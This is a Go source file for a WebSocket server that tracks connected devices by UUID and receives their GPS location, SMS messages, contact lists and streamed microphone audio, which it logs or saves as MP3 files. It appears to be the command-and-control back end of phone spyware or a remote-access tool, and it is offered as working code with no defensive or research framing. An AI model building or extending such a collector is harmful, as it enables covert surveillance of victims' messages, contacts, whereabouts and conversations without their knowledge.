package ws

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os/exec"
	"time"
)

var upgrader = websocket.Upgrader{}

type Message struct {
	Type string          `json:"type"`
	UUID string          `json:"uuid"`
	Data json.RawMessage `json:"data"`
}

type Location struct {
	Lat float64 `json:"latitude"`
	Lon float64 `json:"longitude"`
}

type SMS struct {
	ID      int64  `json:"id"`
	Address string `json:"address"`
	Body    string `json:"body"`
	Date    int64  `json:"date"`
	Type    int    `json:"type"`
}

type Contact struct {
	ID      string `json:"id"`
	Name    string `json:"name"`
	Phone   string `json:"phone"`
	Email   string `json:"email"`
	Address string `json:"address"`
	Company string `json:"company"`
	Title   string `json:"title"`
	Note    string `json:"note"`
	IM      string `json:"im"`
}

func setupPingHandler(connection *websocket.Conn) {
	connection.SetPingHandler(func(appData string) error {
		clients.Lock()
		defer clients.Unlock()

		for _, client := range clients.m {
			if client.Conn == connection {
				client.LastSeen = time.Now().Format(time.RFC1123)
				clients.m[client.UUID] = client
				break
			}
		}

		return connection.WriteControl(websocket.PongMessage, []byte(appData), time.Now().Add(time.Second))
	})
}

func getClient(connection *websocket.Conn, uuid string) Client {
	clients.Lock()

	client, ok := clients.m[uuid]
	if !ok {
		client = Client{
			Conn:      connection,
			UUID:      uuid,
			LastSeen:  time.Now().Format(time.RFC1123),
			Connected: true,
		}

		clients.m[uuid] = client
	} else {
		client.Conn = connection
		client.LastSeen = time.Now().Format(time.RFC1123)
		clients.m[uuid] = client
	}

	clients.Unlock()

	return client
}

func Handler(w http.ResponseWriter, r *http.Request) {
	connection, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("Error during upgrade:", err)
		return
	}

	setupPingHandler(connection)

	for {
		var msg Message
		if err := connection.ReadJSON(&msg); err != nil {

			if websocket.IsCloseError(err) || websocket.IsUnexpectedCloseError(err) {
				log.Printf("WebSocket closed: %v\n", err)

				clients.Lock()
				for _, client := range clients.m {
					if client.Conn == connection {
						client.Connected = false
						clients.m[client.UUID] = client
						break
					}
				}
				clients.Unlock()
				break
			}

			log.Println("Error during read:", err)
			break
		}

		uuid := msg.UUID
		if uuid == "" {
			log.Println("No UUID provided")
			break
		}

		client := getClient(connection, uuid)

		handleMessage(client, msg)
	}

	connection.Close()
}

func handleMessage(client Client, msg Message) {
	switch msg.Type {

	case "connect":
		handleConnect(client)
		break
	case "disconnect":
		handleDisconnect(client)
		break
	case "location":
		var data Location
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			log.Println("Error during unmarshal:", err)
			break
		}
		handleLocation(client, data)
	case "sms":
		var data []SMS
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			log.Println("Error during unmarshal:", err)
			break
		}
		handleSMS(client, data)
	case "contacts":
		var data []Contact
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			log.Println("Error during unmarshal:", err)
			break
		}
		handleContacts(client, data)
	case "audio":
		var data []int
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			log.Println("Error during unmarshal:", err)
			break
		}

		handleAudio(client, data)
		break
	case "stop_audio":
		handleStopAudio(client)
	default:
		log.Println("Unknown message type:", msg.Type)
	}
}

func handleConnect(client Client) {
	clients.Lock()
	defer clients.Unlock()

	client.Connected = true
	clients.m[client.UUID] = client

	log.Println("Client connected:", client.UUID)
}

func handleDisconnect(client Client) {
	clients.Lock()
	defer clients.Unlock()

	if _, ok := clients.m[client.UUID]; ok {
		client.Connected = false
		clients.m[client.UUID] = client
		log.Println("Client disconnected:", client.UUID)
	} else {
		log.Println("Client not found:", client.UUID)
	}
}

func handleLocation(client Client, data Location) {
	clients.Lock()
	defer clients.Unlock()

	if c, ok := clients.m[client.UUID]; ok {
		c.Location = data
		clients.m[client.UUID] = c
		log.Println("Location updated:", client.UUID, data)
	} else {
		log.Println("Client not found:", client.UUID)
	}
}

func handleSMS(client Client, data []SMS) {
	for _, sms := range data {
		log.Println("SMS received:", sms)
	}
}

func handleContacts(client Client, data []Contact) {
	for _, contact := range data {
		log.Println("Contact received:", contact)
	}
}

func handleAudio(client Client, data []int) {
	client.AudioBuffer = append(client.AudioBuffer, data...)
	clients.Lock()
	clients.m[client.UUID] = client
	clients.Unlock()
}

func handleStopAudio(client Client) {
	data := client.AudioBuffer
	clients.Lock()
	client.AudioBuffer = nil
	clients.m[client.UUID] = client
	clients.Unlock()

	uuid := client.UUID
	randomId := time.Now().UnixNano()
	outputName := fmt.Sprintf("output-%s-%d.mp3", uuid, randomId)
	if err := intSliceToMP3(data, outputName); err != nil {
		log.Println("Error during conversion:", err)
		return
	}
}

func intSliceToMP3(data []int, outputFilename string) error {
	buf := new(bytes.Buffer)
	for _, sample := range data {
		s := int16(sample)
		if err := binary.Write(buf, binary.LittleEndian, s); err != nil {
			return err
		}
	}

	cmd := exec.Command("ffmpeg",
		"-f", "s16le",
		"-ar", "44100",
		"-ac", "1",
		"-i", "pipe:0",
		"-y",
		outputFilename,
	)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		stdin.Close()
		return err
	}

	_, err = stdin.Write(buf.Bytes())
	if err != nil {
		stdin.Close()
		return err
	}

	if err = stdin.Close(); err != nil {
		return err
	}

	if err := cmd.Wait(); err != nil {
		return err
	}

	return nil
}
